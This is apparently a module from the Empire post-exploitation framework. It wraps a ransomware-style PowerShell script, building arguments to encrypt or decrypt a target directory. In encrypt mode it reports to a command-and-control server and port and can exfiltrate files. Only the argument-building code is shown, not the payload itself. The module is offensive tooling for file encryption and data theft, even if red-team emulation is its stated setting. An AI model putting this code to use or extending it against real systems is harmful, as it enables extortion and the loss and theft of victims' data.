from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        mode_flag = "-e" if params["Mode"] == "Encrypt" else "-d"
        args = f"$args = @('{mode_flag}', '{params['Directory']}'"

        if params["Mode"] == "Encrypt":
            args += f", '-s', '{params['C2Server']}', '-p', '{params['C2Port']}'"
            if params.get("Exfiltrate") == "True":
                args += ", '-x'"
            if params.get("Demo") == "True":
                args += ", '-demo'"

        elif params["Mode"] == "Decrypt":
            args += f", '-k', '{params['RecoveryKey']}'"

        args += ")\n"

        script = args + script
        return script, ""
